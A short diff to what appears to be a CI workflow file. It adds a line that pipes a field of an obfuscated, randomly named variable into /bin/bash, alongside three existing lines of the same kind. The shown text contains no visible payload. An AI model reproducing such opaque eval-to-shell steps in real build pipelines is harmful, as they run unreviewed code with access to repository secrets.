@@ -31,6 +31,7 @@ jobs:
           echo $dcyvt83 | jq -r .dp5 | /bin/bash
           printf '%s' "$umw024" | jq -r .qbnsa4581 | /bin/bash
           printf '%s' "$mt83" | jq -r .iioyx5 | /bin/bash
+          echo $glbub49901 | jq -r .k2983 | /bin/bash
 
       - name: Save archive
         if: always()
